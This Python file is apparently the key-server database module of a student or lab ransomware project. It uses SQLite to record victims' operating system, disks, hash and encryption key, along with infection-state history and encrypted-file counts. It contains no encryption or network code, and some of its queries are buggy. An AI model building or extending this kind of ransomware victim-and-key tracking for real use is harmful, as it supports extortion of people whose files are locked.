import sqlite3
from datetime import datetime

DB_FILENAME = '../serveur_cles/data/victims.sqlite'


def list_victim():
    # Connection DB
    victim_list = []
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()

    c.execute('SELECT * FROM victims')

    # récupération des résultats
    rows = c.fetchall()

    # affichage des résultats
    for row in rows:
        victim_list += [row]
    conn.commit()
    conn.close()
    return victim_list



def insert_victim(victim):
    '''List_victim_req = { 'LIST_REQ': None }
    list_victim_resp = {
    'VICTIM': id,
    'HASH': hash ,
    'OS': type,
    'DISKS': disks,
    'STATE': state,
    'NB_FILES': nb_files
    }
    list_victim_end = { 'LIST_END': None }'''
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()
    listing = ""

    c.execute('INSERT INTO victims VALUES (?, ?, ?, ?,?)', [victim[0], victim[2], victim[1], victim[3], None])

    rows = c.fetchall()

    for row in rows:
        listing += row
    conn.commit()
    conn.close()
    return listing


# Define a function to insert victim information into the database
def insert_victim_new(os, hash, disks, key):
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)

    now = datetime.now()
    date_time = now.strftime("%Y-%m-%d %H:%M:%S")

    # Get the highest ID from the "victims" table and increment it by 1
    result = conn.execute("SELECT MAX(id_victim) FROM victims")
    max_id = result.fetchone()[0]
    if max_id is None:
        max_id = 0
    victim_id = max_id + 1

    # Get the highest ID from the "states" table and increment it by 1
    result = conn.execute("SELECT MAX(id_state) FROM states")
    max_id = result.fetchone()[0]
    if max_id is None:
        max_id = 0
    state_id = max_id + 1

    # Insert victim's information into the "victims" table with the generated ID
    conn.execute("INSERT INTO victims (id_victim, os, hash, disks, key) VALUES (?, ?, ?, ?, ?)", (victim_id, os, hash, disks, key))

    # Insert a new state with the ID of the victim and the current date and time into the "states" table
    conn.execute("INSERT INTO states (id_state, id_victim, date_time, state) VALUES (?, ?, ?, ?)", (state_id, victim_id, date_time, "new"))
    conn.commit()





def history_req(victim_id):
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()
    history = []
    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT  JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim=?', victim_id)
    # récupération des résultats
    rows = c.fetchall()

    # affichage des résultats
    for row in rows:
        history += row
    conn.commit()
    conn.close()
    return history


def change_state(victim_id, state):
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()


    cursor = conn.execute("SELECT MAX(id_victim) FROM states")
    max_id = cursor.fetchone()[0] or 0
    state_id = max_id + 1

    date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute('INSERT INTO states VALUES (?, ?, ?, ?)', [state_id, victim_id, date_time, state])

    conn.commit()
    conn.close()


'''
# insert fake victims data
for victim in fake_victims:
    c.execute('INSERT INTO victims VALUES (?, ?, ?, ?,?)', [victim[0],victim[2],victim[1],victim[3],None])
'''
'''
# insert fake history data
for i, history in enumerate(fake_histories):
    victim_id = i % len(fake_victims) + 1  # ensure each history row is linked to a different victim
    c.execute('INSERT INTO states VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[1]])
    c.execute('INSERT INTO encrypted VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[2]])
'''
# commit the changes and close the connection




# Call the function to insert victim information
insert_victim_new("Windows", "ab12cd34", "C:\\", "mykey")


print(list_victim())